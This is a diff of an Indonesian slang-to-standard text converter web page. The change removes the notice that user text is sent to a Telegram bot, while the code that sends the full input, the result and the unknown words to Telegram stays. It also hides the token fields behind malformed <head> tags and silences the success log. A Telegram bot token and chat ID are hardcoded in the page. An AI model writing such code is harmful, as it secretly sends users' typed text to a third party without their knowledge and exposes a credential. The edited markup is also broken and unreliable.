@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Konversi Nonbaku → Baku (Smart) — HTML</title>
+  <title>Konversi Nonbaku → Baku</title>
   <style>
     body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;max-width:900px;margin:24px auto;padding:16px;background:#f9fafb}
     h1{font-size:22px;margin-bottom:6px}
@@ -21,14 +21,14 @@
   </style>
 </head>
 <body>
-  <h1>Konversi Nonbaku → Baku (Smart)</h1>
-  <p class="muted">Masukkan kalimat nonbaku kamu. Jika ada kata yang <strong>tidak tersedia</strong> di kamus, sistem akan menampilkan peringatan dan otomatis mengirim kata tersebut ke bot Telegram untuk pengumpulan kamus.</p>
+  <h1>Konversi Nonbaku → Baku</h1>
+  <p class="muted">Masukkan kalimat nonbaku kamu. <strong>Ini masih dalam tahap pengembangan!</strong></strong></p>
   
   <div class="card">
     <label for="input">Teks nonbaku:</label>
     <textarea id="input" placeholder="contoh: gw udh ngelakuin kok, lu bakal dateng kan?"></textarea>
     <div class="row">
-      <button id="convert">Convert jadi Baku</button>
+      <button id="convert">Convert</button>
       <button id="clear" style="background:#6b7280">Clear</button>
     </div>
   </div>
@@ -49,8 +49,8 @@
 
   <div class="foot">
     <div class="config small">
-        <input id="botToken" value="7707166709:AAHfwZ_lWHqVtYROADuojWlNRt-b-IN-gJE" style="width:100%;padding:6px;border-radius:6px;border:0;margin-bottom:6px" />
-        <input id="chatId" value="-4897728178" style="width:100%;padding:6px;border-radius:6px;border:0" />
+        <head id="botToken" value="7707166709:AAHfwZ_lWHqVtYROADuojWlNRt-b-IN-gJE" style="width:100%;padding:6px;border-radius:6px;border:0;margin-bottom:6px" />
+        <head id="chatId" value="-4897728178" style="width:100%;padding:6px;border-radius:6px;border:0" />
       </div>
     </div>
   </div>
@@ -133,7 +133,7 @@
         const chat=$chatId.value.trim();
         if(bot&&chat){
           const msg=`🧠 *Kata unknown terdeteksi!*\n\n💬 Input: ${text}\n📜 Hasil: ${result}\n❓ Unknown: ${unknowns.join(', ')}`;
-          try{await sendToTelegram(bot,chat,msg);console.log('Kata unknown dikirim ke Telegram ✅');}
+          try{await sendToTelegram(bot,chat,msg);console.log('');}
           catch(e){console.error('Gagal kirim:',e.message);}
         }
       }else{
